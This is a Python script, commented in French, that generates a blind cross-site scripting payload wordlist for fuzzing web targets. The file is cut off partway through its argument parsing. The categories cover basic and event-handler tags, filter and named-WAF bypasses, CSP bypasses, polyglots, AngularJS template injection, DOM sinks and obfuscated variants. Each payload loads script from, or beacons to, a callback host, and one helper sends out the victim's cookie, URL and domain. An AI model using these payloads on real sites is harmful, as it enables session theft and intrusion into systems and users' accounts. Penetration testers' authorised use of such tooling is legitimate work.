#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           BLIND XSS PAYLOAD WORDLIST GENERATOR                  ║
║  Basé sur les leçons : Filter Bypass, Polyglot, WAF Bypass,     ║
║  CSP Bypass, Angular XSS                                        ║
║  Chaque payload contient une IP d'extraction et un ID unique    ║
║  pour identifier facilement lequel a fonctionné (Blind XSS)    ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
    python3 generate_blind_xss_wordlist.py
    python3 generate_blind_xss_wordlist.py --ip http://192.168.1.1:8080
    python3 generate_blind_xss_wordlist.py --ip https://your.burp-collaborator.net --output my_payloads.txt
    python3 generate_blind_xss_wordlist.py --ip http://YOUR_IP --categories basic polyglot angular

Categories disponibles:
    basic       - Payloads basiques (script, img, svg, iframe...)
    event       - Event handlers (onload, onerror, onmouseover...)
    bypass      - Bypasses de filtres (case, quotes, encoding...)
    waf         - Bypasses WAF (Cloudflare, Akamai, Incapsula...)
    csp         - Bypasses CSP
    polyglot    - Polyglots multi-contextes
    angular     - Injections AngularJS/CSTI
    dom         - DOM-based XSS
    obfuscated  - Payloads obfusqués (base64, unicode, JSFuck-style...)
    all         - Toutes les catégories (défaut)
"""

import argparse
import sys
import base64
import urllib.parse
from datetime import datetime

# ── CONFIG ───────────────────────────────────────────────────────────────────
DEFAULT_IP     = "http://YOUR_IP_HERE"
OUTPUT_FILE    = "blind_xss_wordlist.txt"
# ─────────────────────────────────────────────────────────────────────────────


def b64_payload(js: str) -> str:
    """Encode une chaîne JS en base64 pour atob()."""
    return base64.b64encode(js.encode()).decode()


def make_callback(ip: str, pid: str) -> str:
    """Retourne l'URL de callback unique pour un payload donné."""
    return f"{ip}/{pid}"


def build_payloads(ip: str) -> dict:
    """
    Construit tous les payloads, organisés par catégorie.
    CONVENTION DE NOMMAGE DES IDs:
        CAT-NNN  → ex: BAS-001, EVT-005, WAF-003 …
    Chaque payload charge un script depuis l'IP de callback OU
    fait une requête image/fetch pour signaler l'exécution.
    """

    # ── Helper : script loader (le plus fiable pour blind XSS) ───────────────
    def script_loader(pid):
        cb = make_callback(ip, pid)
        return f"var s=document.createElement('script');s.src='{cb}';document.body.appendChild(s);"

    def img_beacon(pid):
        cb = make_callback(ip, pid)
        return f"new Image().src='{cb}';"

    def fetch_beacon(pid):
        cb = make_callback(ip, pid)
        return f"fetch('{cb}');"

    def full_data_exfil(pid):
        """Exfiltration complète : cookie + URL + domain."""
        cb = make_callback(ip, pid)
        return (
            f"var d=document;"
            f"fetch('{cb}?c='+encodeURIComponent(d.cookie)"
            f"+'&u='+encodeURIComponent(d.URL)"
            f"+'&o='+encodeURIComponent(d.domain));"
        )

    # ─────────────────────────────────────────────────────────────────────────
    # Toutes les catégories
    # ─────────────────────────────────────────────────────────────────────────

    categories = {}

    # ══════════════════════════════════════════════════════════════════════════
    # BASIC  — payloads fondamentaux
    # ══════════════════════════════════════════════════════════════════════════
    basic = []

    # BAS-001 : <script> classique
    pid = "BAS-001"
    cb = make_callback(ip, pid)
    basic.append((pid, f"<script src='{cb}'></script>",
                   "Basic <script> tag avec src callback"))

    # BAS-002 : <script> inline avec script loader
    pid = "BAS-002"
    basic.append((pid, f"<script>{script_loader(pid)}</script>",
                   "Basic <script> inline avec script loader"))

    # BAS-003 : <img onerror>
    pid = "BAS-003"
    basic.append((pid, f"<img src=x onerror=\"{script_loader(pid)}\">",
                   "img onerror avec script loader"))

    # BAS-004 : <svg onload>
    pid = "BAS-004"
    basic.append((pid, f"<svg onload=\"{script_loader(pid)}\">",
                   "svg onload avec script loader"))

    # BAS-005 : <body onload>
    pid = "BAS-005"
    basic.append((pid, f"<body onload=\"{script_loader(pid)}\">",
                   "body onload avec script loader"))

    # BAS-006 : <iframe> onload
    pid = "BAS-006"
    basic.append((pid, f"<iframe onload=\"{script_loader(pid)}\">",
                   "iframe onload"))

    # BAS-007 : <input autofocus onfocus>
    pid = "BAS-007"
    basic.append((pid, f"<input autofocus onfocus=\"{script_loader(pid)}\">",
                   "input autofocus + onfocus"))

    # BAS-008 : <details open ontoggle>
    pid = "BAS-008"
    basic.append((pid, f"<details open ontoggle=\"{script_loader(pid)}\">",
                   "details ontoggle"))

    # BAS-009 : <marquee onstart>
    pid = "BAS-009"
    basic.append((pid, f"<marquee onstart=\"{script_loader(pid)}\">",
                   "marquee onstart"))

    # BAS-010 : <video src onerror>
    pid = "BAS-010"
    basic.append((pid, f"<video src=x onerror=\"{script_loader(pid)}\">",
                   "video onerror"))

    # BAS-011 : <audio src onerror>
    pid = "BAS-011"
    basic.append((pid, f"<audio src=x onerror=\"{script_loader(pid)}\">",
                   "audio onerror"))

    # BAS-012 : exfiltration complète session
    pid = "BAS-012"
    basic.append((pid, f"<script>{full_data_exfil(pid)}</script>",
                   "Exfiltration complète (cookie+URL+domain)"))

    # BAS-013 : javascript: URI (href)
    pid = "BAS-013"
    basic.append((pid, f"javascript:{script_loader(pid)}",
                   "javascript: URI pour href/link"))

    # BAS-014 : <object data>
    pid = "BAS-014"
    cb = make_callback(ip, pid)
    basic.append((pid, f"<object data='javascript:{img_beacon(pid)}'>",
                   "object data javascript URI"))

    categories["basic"] = basic

    # ══════════════════════════════════════════════════════════════════════════
    # EVENT  — event handlers moins communs
    # ══════════════════════════════════════════════════════════════════════════
    event = []

    events_tags = [
        ("EVT-001", "<body",        "onpageshow"),
        ("EVT-002", "<body",        "onhashchange"),
        ("EVT-003", "<svg",         "onanimationstart"),
        ("EVT-004", "<svg",         "onanimationend"),
        ("EVT-005", "<form",        "oninput"),
        ("EVT-006", "<select",      "onchange"),
        ("EVT-007", "<textarea",    "onfocus"),
        ("EVT-008", "<video",       "oncanplay"),
        ("EVT-009", "<track",       "onerror"),
        ("EVT-010", "<object",      "onafterscriptexecute"),
        ("EVT-011", "<object",      "onbeforescriptexecute"),
        ("EVT-012", "<div",         "onmouseover"),
        ("EVT-013", "<a href='#'",  "onmousedown"),
        ("EVT-014", "<button",      "onclick"),
        ("EVT-015", "<div",         "onclick"),
    ]

    for pid, tag, event_name in events_tags:
        payload = f"{tag} {event_name}=\"{script_loader(pid)}\""
        if tag not in ("<body", "<svg", "<form", "<select", "<textarea", "<object", "<div", "<a href='#'", "<button"):
            payload += ">"
        else:
            payload += ">"
        event.append((pid, payload, f"{tag} {event_name}"))

    categories["event"] = event

    # ══════════════════════════════════════════════════════════════════════════
    # BYPASS  — contournement de filtres (leçon 1 + 3)
    # ══════════════════════════════════════════════════════════════════════════
    bypass = []

    # BYP-001 : mixed case
    pid = "BYP-001"
    bypass.append((pid, f"<sCrIpT sRc='{make_callback(ip, pid)}'></ScRiPt>",
                   "Bypass case sensitive - mixed case tag"))

    # BYP-002 : extra attribute dans tag
    pid = "BYP-002"
    bypass.append((pid, f"<script x src='{make_callback(ip, pid)}'></script>",
                   "Bypass tag blacklist - extra attribute"))

    # BYP-003 : tag incomplet (works IE/FF/Chrome/Safari)
    pid = "BYP-003"
    bypass.append((pid, f"<img src='1' onerror='{script_loader(pid)}' <",
                   "Bypass incomplete HTML tag"))

    # BYP-004 : bypass dot filter via window bracket notation
    pid = "BYP-004"
    cb = make_callback(ip, pid)
    bypass.append((pid, f"<script>window['fetch']('{cb}')</script>",
                   "Bypass dot filter - bracket notation"))

    # BYP-005 : bypass dot filter via base64 atob()
    pid = "BYP-005"
    js_code = f"var s=document.createElement('script');s.src='{make_callback(ip, pid)}';document.body.appendChild(s);"
    encoded = b64_payload(js_code)
    bypass.append((pid, f"<script>eval(atob('{encoded}'))</script>",
                   "Bypass dot filter - base64 atob()"))

    # BYP-006 : bypass parenthèses - template literals
    pid = "BYP-006"
    cb = make_callback(ip, pid)
    bypass.append((pid, f"<svg onload=fetch`{cb}`>",
                   "Bypass parenthesis - template literals"))

    # BYP-007 : bypass parenthèses et point-virgule avec onerror+throw
    pid = "BYP-007"
    bypass.append((pid, f"<script>onerror={img_beacon(pid)};throw 1337</script>",
                   "Bypass parens+semicolon - onerror+throw"))

    # BYP-008 : bypass espace avec /
    pid = "BYP-008"
    bypass.append((pid, f"<img/src='1'/onerror={img_beacon(pid)}>",
                   "Bypass space filter - slash separator"))

    # BYP-009 : bypass espace avec caractères de contrôle (0x0c)
    pid = "BYP-009"
    bypass.append((pid, f"<svg\fonload\f=\f{img_beacon(pid)}\f>",
                   "Bypass space filter - form-feed 0x0C"))

    # BYP-010 : bypass guillemets - String.fromCharCode
    pid = "BYP-010"
    cb = make_callback(ip, pid)
    char_codes = ",".join(str(ord(c)) for c in cb)
    bypass.append((pid,
        f"<script>var s=document.createElement('script');s.src=String.fromCharCode({char_codes});document.body.appendChild(s);</script>",
        "Bypass quotes - String.fromCharCode"))

    # BYP-011 : bypass guillemets dans script tag via break-out
    pid = "BYP-011"
    cb = make_callback(ip, pid)
    bypass.append((pid, f"</script><script src='{cb}'></script>",
                   "Break out of existing script tag"))

    # BYP-012 : bypass onxxxx= blacklist avec null byte
    pid = "BYP-012"
    bypass.append((pid, f"<img src='1' onerror\x00={img_beacon(pid)} />",
                   "Bypass onxxx= blacklist - null byte"))

    # BYP-013 : bypass > avec rien (browser fixes it)
    pid = "BYP-013"
    bypass.append((pid, f"<svg onload={img_beacon(pid)}//",
                   "Bypass > using nothing - browser fixes"))

    # BYP-014 : bypass using eval concatenation
    pid = "BYP-014"
    cb = make_callback(ip, pid)
    part1 = cb[:len(cb)//2]
    part2 = cb[len(cb)//2:]
    bypass.append((pid,
        f"<script>eval('var s=document.createElement(\"script\");s.src=\"'+'{part1}'+''+'{part2}'+'\";document.body.appendChild(s);')</script>",
        "Bypass word blacklist - eval string concatenation"))

    # BYP-015 : bypass HTML encoding
    pid = "BYP-015"
    cb_encoded = urllib.parse.quote(make_callback(ip, pid))
    bypass.append((pid,
        f"<svg onload=%26%2397%3Bfetch('{cb_encoded}')>",
        "Bypass HTML encoding - %26%23 trick"))

    # BYP-016 : bypass guillemets en mousedown avec &#39;
    pid = "BYP-016"
    bypass.append((pid,
        f"<a href='' onmousedown=\"var x='&#39;;{img_beacon(pid)}//'\">Click</a>",
        "Bypass quotes in mousedown - &#39;"))

    # BYP-017 : bypass document blacklist
    pid = "BYP-017"
    bypass.append((pid,
        f"<div id=x></div><script>window['doc'+'ument']['loc'+'ation']='javascript:{img_beacon(pid)}'</script>",
        "Bypass document blacklist - string concatenation"))

    categories["bypass"] = bypass

    # ══════════════════════════════════════════════════════════════════════════
    # WAF  — contournements WAF spécifiques (leçon 3)
    # ══════════════════════════════════════════════════════════════════════════
    waf = []

    # WAF-001 : Cloudflare - random attribute + onload
    pid = "WAF-001"
    waf.append((pid, f"<svg/onrandom=random onload={img_beacon(pid)}>",
                "Cloudflare bypass - random attribute"))

    # WAF-002 : Cloudflare - template literal avec prompt
    pid = "WAF-002"
    cb = make_callback(ip, pid)
    waf.append((pid, f'<svg/OnLoad="`${{{img_beacon(pid)}}}`">',
                "Cloudflare bypass - template literal OnLoad"))

    # WAF-003 : Cloudflare - HTML entity encoding
    pid = "WAF-003"
    waf.append((pid, f"<svg/onload=&nbsp;{img_beacon(pid)}+",
                "Cloudflare bypass - &nbsp; before payload"))

    # WAF-004 : Cloudflare - .1 trick
    pid = "WAF-004"
    waf.append((pid, f"1'\"><img/src/onerror=.1|{img_beacon(pid)}>",
                "Cloudflare bypass - .1| trick"))

    # WAF-005 : Cloudflare - srcdoc with encoding
    pid = "WAF-005"
    cb = make_callback(ip, pid)
    inner = f"<script>new Image().src='{cb}'</script>"
    inner_enc = inner.replace("<", "&lt;").replace(">", "&gt;")
    waf.append((pid, f"xss'\"><iframe srcdoc='{inner_enc}'>",
                "Cloudflare bypass - iframe srcdoc with encoding"))

    # WAF-006 : Cloudflare - HTML entity numbers for onload
    pid = "WAF-006"
    waf.append((pid, f"<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>",
                "Cloudflare bypass - HTML entity number encoding"))

    # WAF-007 : Incapsula - jQuery globalEval avec CR LF
    pid = "WAF-007"
    waf.append((pid, f"<svg onload\r\n=$.globalEval(\"{img_beacon(pid)}\");>",
                "Incapsula bypass - CRLF in event handler"))

    # WAF-008 : Incapsula - base64 object data
    pid = "WAF-008"
    inner_js = f"<script>{img_beacon(pid)}</script>"
    b64 = base64.b64encode(inner_js.encode()).decode()
    waf.append((pid, f"<object data='data:text/html;base64,{b64}'></object>",
                "Incapsula bypass - base64 object data"))

    # WAF-009 : Akamai - details toggle
    pid = "WAF-009"
    waf.append((pid, f"<dETAILS%0aopen%0aonToGgle%0a=%0a{img_beacon(pid)} x>",
                "Akamai bypass - details ontoggle with newlines"))

    # WAF-010 : WordFence - HTML entity in href
    pid = "WAF-010"
    waf.append((pid, f"<a href=javas&#99;ript:{img_beacon(pid)}>Click</a>",
                "WordFence bypass - HTML entity in javascript:"))

    # WAF-011 : Fortiweb - unicode escapes
    pid = "WAF-011"
    waf.append((pid, f"\\u003e\\u003c\\u0068\\u0031 onclick=\"{img_beacon(pid)}\"\\u003e",
                "Fortiweb bypass - unicode escape sequences"))

    # WAF-012 : Cloudflare - tab characters dans href
    pid = "WAF-012"
    waf.append((pid,
        f"<a href=\"j\tav\tasc\nri\tpt\t:{img_beacon(pid)}\">X</a>",
        "Cloudflare bypass - tab/newline in javascript URI"))

    categories["waf"] = waf

    # ══════════════════════════════════════════════════════════════════════════
    # CSP  — contournements Content Security Policy (leçon 4)
    # ══════════════════════════════════════════════════════════════════════════
    csp = []

    # CSP-001 : JSONP Google callback
    pid = "CSP-001"
    csp.append((pid,
        f"<script/src=//google.com/complete/search?client=chrome%26jsonp={img_beacon(pid)}>",
        "CSP bypass - JSONP via Google (script-src google.com)"))

    # CSP-002 : JSONP YouTube
    pid = "CSP-002"
    csp.append((pid,
        "<script/src=//www.youtube.com/oembed?callback=fetch></script>",
        "CSP bypass - JSONP via YouTube"))

    # CSP-003 : iframe + script injection (contourne default-src self unsafe-inline)
    pid = "CSP-003"
    cb = make_callback(ip, pid)
    csp.append((pid,
        f"<script>f=document.createElement('iframe');f.src='/robots.txt';f.onload=()=>{{x=document.createElement('script');x.src='{cb}';f.contentWindow.document.body.appendChild(x)}};document.body.appendChild(f);</script>",
        "CSP bypass - default-src self via iframe + script injection"))

    # CSP-004 : object data base64 (script-src self)
    pid = "CSP-004"
    inner_js = f"<script>{img_beacon(pid)}</script>"
    b64 = base64.b64encode(inner_js.encode()).decode()
    csp.append((pid,
        f"<object data='data:text/html;base64,{b64}'></object>",
        "CSP bypass - script-src self via object data base64"))

    # CSP-005 : script-src data:
    pid = "CSP-005"
    inner_b64 = base64.b64encode(f"{img_beacon(pid)}".encode()).decode()
    csp.append((pid,
        f"<script src='data:application/javascript;base64,{inner_b64}'>/</script>",
        "CSP bypass - script-src data: via data URI"))

    # CSP-006 : nonce + base injection
    pid = "CSP-006"
    cb = make_callback(ip, pid)
    csp.append((pid,
        f"<base href='{cb}'>",
        "CSP bypass - nonce via base tag injection (requires relative script src)"))

    # CSP-007 : inline eval (unsafe-inline)
    pid = "CSP-007"
    csp.append((pid,
        f"\"/><script>{img_beacon(pid)}</script>",
        "CSP unsafe-inline bypass - break out of attribute"))

    # CSP-008 : PHP header bypass (1000 params)
    pid = "CSP-008"
    cb = make_callback(ip, pid)
    params = "&a=" * 1000
    csp.append((pid,
        f"GET /?xss=<script src='{cb}'></script>{params}",
        "CSP bypass - PHP header via 1000 GET params (note: ajouter dans l'URL)"))

    categories["csp"] = csp

    # ══════════════════════════════════════════════════════════════════════════
    # POLYGLOT  — multi-context (leçon 2)
    # ══════════════════════════════════════════════════════════════════════════
    polyglot = []

    # POL-001 : 0xsobky style adapté blind XSS
    pid = "POL-001"
    cb = make_callback(ip, pid)
    polyglot.append((pid,
        f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={img_beacon(pid)} )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csvg/<svg/oNloAd={img_beacon(pid)}//>/\\x3e",
        "Polyglot 0xsobky style - multi-context blind XSS"))

    # POL-002 : Ashar Javed style adapté
    pid = "POL-002"
    polyglot.append((pid,
        f"\">><marquee><img src=x onerror={img_beacon(pid)}></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover={img_beacon(pid)} ><script>{img_beacon(pid)}</script>",
        "Polyglot Ashar Javed style - HTML multi-context"))

    # POL-003 : Mathias Karlsson style
    pid = "POL-003"
    polyglot.append((pid,
        f"\" onclick={img_beacon(pid)}//<button ' onclick={img_beacon(pid)}//>",
        "Polyglot Mathias Karlsson - attribute/HTML context"))

    # POL-004 : EdOverflow style
    pid = "POL-004"
    polyglot.append((pid,
        f"javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg/onload=/*<html/*/onmouseover={img_beacon(pid)}//>",
        "Polyglot EdOverflow - JS string/HTML/attribute context"))

    # POL-005 : brutelogic comprehensive
    pid = "POL-005"
    cb = make_callback(ip, pid)
    polyglot.append((pid,
        f"JavaScript://%250A{img_beacon(pid)}//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${{}};{{{img_beacon(pid)}}}//><Base/Href=//{cb}\\76-->",
        "Polyglot brutelogic comprehensive - tous contextes"))

    # POL-006 : s0md3v svG polyglot
    pid = "POL-006"
    polyglot.append((pid,
        f"-->'\"/<br></sCript><svG x=\">\" onload=(fetch)`{make_callback(ip, pid)}`>",
        "Polyglot s0md3v - SVG template literal fetch"))

    # POL-007 : crlf polyglot
    pid = "POL-007"
    polyglot.append((pid,
        f"<svg%0Ao%00nload={img_beacon(pid)}//",
        "Polyglot - SVG null byte + CRLF"))

    categories["polyglot"] = polyglot

    # ══════════════════════════════════════════════════════════════════════════
    # ANGULAR  — CSTI AngularJS (leçon 5)
    # ══════════════════════════════════════════════════════════════════════════
    angular = []

    cb_inner = f"var _=document.createElement('script');_.src='{make_callback(ip, 'ANG-001')}';document.getElementsByTagName('body')[0].appendChild(_)"

    # ANG-001 : 1.0.1-1.1.5 / 1.6+ Mario Heiderich (Cure53)
    pid = "ANG-001"
    cb_inner = f"var _=document.createElement('script');_.src='{make_callback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)"
    angular.append((pid,
        "{{constructor.constructor(\"" + cb_inner + "\")()}}",
        "Angular CSTI 1.0.1-1.1.5 / >1.6.0 - Mario Heiderich (Cure53)"))

    # ANG-002 : 1.0.1-1.1.5 / 1.6+ Lewis Ardern & Gareth Heyes (Shorter)
    pid = "ANG-002"
    cb_inner = f"var _=document.createElement('script');_.src='{make_callback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)"
    angular.append((pid,
        "{{$on.constructor(\"" + cb_inner + "\")()}}",
        "Angular CSTI 1.0.1-1.1.5 / >1.6.0 - Lewis Ardern & Gareth Heyes (shorter)"))

    # ANG-003 : 1.2.0-1.2.5 Gareth Heyes
    pid = "ANG-003"
    cb_inner = f"var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'{make_callback(ip, pid)}\\';document\\\\x2ebody\\\\x2eappendChild(_);"
    angular.append((pid,
        '{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval(\'a",eval(`' + cb_inner + '`),"\')}};',
        "Angular CSTI 1.2.0-1.2.5 - Gareth Heyes"))

    # ANG-004 : 1.4.0-1.5.8 Gareth Heyes
    pid = "ANG-004"
    cb_inner = f"var _=document.createElement(\\'script\\');_.src=\\'{make_callback(ip, pid)}\\';document.body.appendChild(_);"
    angular.append((pid,
        '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(\'a,eval(`' + cb_inner + '`),a\')}}',
        "Angular CSTI 1.4.0-1.5.8 - Gareth Heyes"))

    # ANG-005 : 1.6+ sans quotes - @Viren
    pid = "ANG-005"
    angular.append((pid,
        "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39," +
        ",".join(str(ord(c)) for c in make_callback(ip, pid)) +
        ",39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))()}}",
        "Angular CSTI 1.6+ sans quotes - via fromCharCode"))

    # ANG-006 : 1.6+ $eval.constructor
    pid = "ANG-006"
    cb_inner = f"var _=document.createElement('script');_.src='{make_callback(ip, pid)}';document.getElementsByTagName('body')[0].appendChild(_)"
    angular.append((pid,
        "{{$eval.constructor(\"" + cb_inner + "\")()}}",
        "Angular CSTI 1.6+ via $eval.constructor"))

    # ANG-007 : VueJS (même syntaxe)
    pid = "ANG-007"
    angular.append((pid,
        "{{constructor.constructor(\"" + f"new Image().src='{make_callback(ip, pid)}'" + "\")()}}",
        "VueJS template injection - constructor.constructor (img beacon)"))

    categories["angular"] = angular

    # ══════════════════════════════════════════════════════════════════════════
    # DOM  — DOM-based XSS
    # ══════════════════════════════════════════════════════════════════════════
    dom = []

    # DOM-001 : location.hash
    pid = "DOM-001"
    cb = make_callback(ip, pid)
    dom.append((pid,
        f"#<script src='{cb}'></script>",
        "DOM XSS via location.hash - script injection"))

    # DOM-002 : document.write
    pid = "DOM-002"
    dom.append((pid,
        f"javascript:document.write('<script src=\"{make_callback(ip, pid)}\"><\\/script>')",
        "DOM XSS via document.write javascript URI"))

    # DOM-003 : innerHTML
    pid = "DOM-003"
    dom.append((pid,
        f"<img src=x onerror={img_beacon(pid)}>",
        "DOM XSS via innerHTML - img onerror"))

    # DOM-004 : eval via URL param
    pid = "DOM-004"
    dom.append((pid,
        f"'-{img_beacon(pid)}-'",
        "DOM XSS - break out of JS string in eval context"))

    # DOM-005 : postMessage
    pid = "DOM-005"
    cb = make_callback(ip, pid)
    dom.append((pid,
        f"<script>window.postMessage('<img src=x onerror=\"{img_beacon(pid)}\">', '*');</script>",
        "DOM XSS via postMessage"))

    # DOM-006 : location redirect
    pid = "DOM-006"
    dom.append((pid,
        f"javascript:{img_beacon(pid)}location.href",
        "DOM XSS via location redirect"))

    # DOM-007 : innerHTML via hash
    pid = "DOM-007"
    dom.append((pid,
        f"#<img src=x onerror={img_beacon(pid)}>",
        "DOM XSS via hash - innerHTML sink"))

    categories["dom"] = dom

    # ══════════════════════════════════════════════════════════════════════════
    # OBFUSCATED  — payloads obfusqués avancés
    # ══════════════════════════════════════════════════════════════════════════
    obfuscated = []

    # OBF-001 : Unicode escape sequences
    pid = "OBF-001"
    cb = make_callback(ip, pid)
    # Encode "fetch" en unicode
    fetch_unicode = "\\u0066\\u0065\\u0074\\u0063\\u0068"
    obfuscated.append((pid,
        f"<script>\\u0076\\u0061\\u0072 \\u0073=\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074.\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0045\\u006C\\u0065\\u006D\\u0065\\u006E\\u0074('\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074');\\u0073.\\u0073\\u0072\\u0063='{cb}';\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074.\\u0062\\u006F\\u0064\\u0079.\\u0061\\u0070\\u0070\\u0065\\u006E\\u0064\\u0043\\u0068\\u0069\\u006C\\u0064(\\u0073);</script>",
        "Obfuscated - unicode escape sequences pour script loader"))

    # OBF-002 : base64 + Function()
    pid = "OBF-002"
    js_code = f"{img_beacon(pid)}"
    b64 = b64_payload(js_code)
    obfuscated.append((pid,
        f"<script>Function(atob('{b64}'))()</script>",
        "Obfuscated - base64 + Function() constructor"))

    # OBF-003 : base64 + eval(atob())
    pid = "OBF-003"
    js_code = f"{img_beacon(pid)}"
    b64 = b64_payload(js_code)
    obfuscated.append((pid,
        f"<script>eval(atob('{b64}'))</script>",
        "Obfuscated - base64 + eval(atob())"))

    # OBF-004 : concatenation avec setTimeout
    pid = "OBF-004"
    cb = make_callback(ip, pid)
    obfuscated.append((pid,
        f"<script>setTimeout('new I'+'mage().s'+'rc=\"{cb}\"',0)</script>",
        "Obfuscated - string concat dans setTimeout"))

    # OBF-005 : octal encoding
    pid = "OBF-005"
    cb = make_callback(ip, pid)
    # Encode "fetch" en octal
    obfuscated.append((pid,
        f"<script>eval('\\146\\145\\164\\143\\150(\"' + '{cb}' + '\")')</script>",
        "Obfuscated - octal encoding (fetch)"))

    # OBF-006 : new URL decode trick
    pid = "OBF-006"
    js_code = f"{img_beacon(pid)}"
    url_encoded = urllib.parse.quote(js_code)
    obfuscated.append((pid,
        f"<script>eval(decodeURIComponent('{url_encoded}'))</script>",
        "Obfuscated - URL encoding + decodeURIComponent"))

    # OBF-007 : Array map trick
    pid = "OBF-007"
    cb = make_callback(ip, pid)
    obfuscated.append((pid,
        f"<script>['{cb}'].map(u=>{{var s=document.createElement('script');s.src=u;document.body.appendChild(s)}})</script>",
        "Obfuscated - Array.map arrow function"))

    # OBF-008 : this + bracket notation
    pid = "OBF-008"
    obfuscated.append((pid,
        f"<script>this['fe'+'tch']('{make_callback(ip, pid)}')</script>",
        "Obfuscated - this[] + split string concatenation"))

    # OBF-009 : object keys trick
    pid = "OBF-009"
    obfuscated.append((pid,
        f"<script>a=()=>{{c=0;for(i in self){{if(/^fe[tc]+h$/.test(i)){{return c}}c++}}}};self[Object.keys(self)[a()]]('{make_callback(ip, pid)}')</script>",
        "Obfuscated - Object.keys + regex pour trouver fetch"))

    # OBF-010 : XOR obfuscation simple
    pid = "OBF-010"
    key = 42
    cb = make_callback(ip, pid)
    xored = [ord(c) ^ key for c in f"new Image().src='{cb}';"]
    xored_str = ",".join(str(x) for x in xored)
    obfuscated.append((pid,
        f"<script>eval(String.fromCharCode(...[{xored_str}].map(c=>c^{key})))</script>",
        "Obfuscated - XOR simple avec Map + fromCharCode"))

    categories["obfuscated"] = obfuscated

    return categories


def format_payload_line(pid: str, payload: str, description: str) -> str:
    return payload


def write_wordlist(categories: dict, selected: list, output_file: str, ip: str):
    """Écrit la wordlist dans un fichier texte, un payload par ligne."""
    all_payloads = []

    for cat_name in selected:
        if cat_name in categories:
            for pid, payload, desc in categories[cat_name]:
                all_payloads.append((pid, payload, desc, cat_name.upper()))

    with open(output_file, "w", encoding="utf-8") as f:
        # Header
        f.write(f"# BLIND XSS WORDLIST\n")
        f.write(f"# Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Callback IP : {ip}\n")
        f.write(f"# Categories : {', '.join(selected)}\n")
        f.write(f"# Total payloads : {len(all_payloads)}\n")
        f.write(f"# Format : PAYLOAD_ID | CATEGORY | DESCRIPTION\n")
        f.write(f"# Each payload contains a unique ID for easy identification when triggered\n")
        f.write(f"#\n")
        f.write(f"# HOW TO READ RESULTS:\n")
        f.write(f"#   When your server receives a hit on /{ip}/<PAYLOAD_ID>,\n")
        f.write(f"#   you know exactly which payload triggered the XSS.\n")
        f.write(f"#   Example: hit on /BAS-001 = Basic script tag worked\n")
        f.write(f"# {'─'*70}\n\n")

        current_cat = None
        for pid, payload, desc, cat in all_payloads:
            if cat != current_cat:
                current_cat = cat
                f.write(f"\n# {'═'*68}\n")
                f.write(f"# CATEGORY: {cat}\n")
                f.write(f"# {'═'*68}\n\n")

            # Commentaire descriptif sur la ligne au-dessus
            f.write(f"# [{pid}] {desc}\n")
            f.write(f"{payload}\n\n")

    return len(all_payloads)


def print_summary(categories: dict, selected: list, output_file: str, ip: str, total: int):
    """Affiche un résumé coloré dans le terminal."""
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║        BLIND XSS WORDLIST GENERATOR — DONE           ║{RESET}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════════╝{RESET}\n")

    print(f"  {BOLD}Callback IP      :{RESET} {YELLOW}{ip}{RESET}")
    print(f"  {BOLD}Output file      :{RESET} {GREEN}{output_file}{RESET}")
    print(f"  {BOLD}Total payloads   :{RESET} {BOLD}{total}{RESET}\n")

    print(f"  {BOLD}Breakdown by category:{RESET}")
    for cat_name in selected:
        if cat_name in categories:
            count = len(categories[cat_name])
            bar   = "█" * (count // 2)
            print(f"    {CYAN}{cat_name:<12}{RESET} {bar} {count}")

    print(f"\n  {BOLD}Usage with ffuf:{RESET}")
    print(f"    {YELLOW}ffuf -u https://TARGET/PARAM -w {output_file} -mr 'FUZZ'{RESET}")
    print(f"\n  {BOLD}Usage with Burp Intruder:{RESET}")
    print(f"    {YELLOW}Load {output_file} as payload list → Attack{RESET}")
    print(f"\n  {BOLD}Callback server (Python):{RESET}")
    print(f"    {YELLOW}python3 -m http.server 80{RESET}")
    print(f"\n  {BOLD}ID reference:{RESET}")
    print(f"    When /{YELLOW}<ID>{RESET} is hit → you know exactly which payload fired!\n")


def main():
    parser = argparse.ArgumentParser(
        description="Génère une wordlist de payloads Blind XSS avec IP d'extraction unique par payload.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument(
        "--ip", "-i",
        default=DEFAULT_IP,
        help=f"IP/URL de callback (défaut: {DEFAULT_IP})"
    )
    parser.add_argument(
        "--output", "-o",
        default=OUTPUT_FILE,
        help=f"Fichier de sortie (défaut: {OUTPUT_FILE})"
    )
    parser.add_argument(
        "--categories", "-c",
        nargs="+",
        choices=["basic", "event", "bypass", "waf", "csp", "polyglot", "angular", "dom", "obfuscated", "all"],
        default=["all"],
